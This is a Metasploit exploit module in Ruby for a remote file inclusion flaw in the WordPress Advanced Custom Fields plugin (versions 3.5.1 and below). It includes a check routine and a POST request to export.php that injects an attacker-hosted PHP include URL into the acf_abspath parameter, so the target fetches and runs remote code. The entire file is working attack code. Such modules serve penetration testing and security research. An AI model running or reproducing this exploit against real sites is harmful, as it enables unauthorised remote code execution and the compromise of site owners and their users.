# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer::PHPInclude
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;WordPress Plugin Advanced Custom Fields Remote File Inclusion&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a remote file inclusion flaw in the WordPress blogging
                software plugin known as Advanced Custom Fields. The vulnerability allows for remote
                file inclusion and remote code execution via the export.php script. The Advanced
                Custom Fields plug-in versions 3.5.1 and below are vulnerable. This exploit only
                works when the php option allow_url_include is set to On (Default Off).
            },
            &#039;Author&#039;         =>
                [
                    &#039;Charlie Eriksen <charlie@ceriksen.com>&#039;,
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;87353&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/51037/&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;ConnectionType&#039; => &#039;find&#039;,
                        },
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Nov 14 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The full URI path to WordPress&#039;, &#039;/&#039;]),
                OptString.new(&#039;PLUGINSPATH&#039;, [true, &#039;The relative path to the plugins folder&#039;, &#039;wp-content/plugins/&#039;]),
            ], self.class)
    end
 
    def check
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        uri << datastore[&#039;PLUGINSPATH&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{uri}advanced-custom-fields/core/api.php"
        })
 
        if res and res.code == 200
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def php_exploit
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        uri << datastore[&#039;PLUGINSPATH&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
        print_status(&#039;Sending request&#039;)
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{uri}advanced-custom-fields/core/actions/export.php",
            &#039;data&#039;   => "acf_abspath=#{php_include_url}"
        })
 
        if res and res.body =~ /allow_url_include/
            fail_with(Exploit::Failure::NotVulnerable, &#039;allow_url_include is disabled&#039;)
        elsif res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
        end
 
    end
 
end

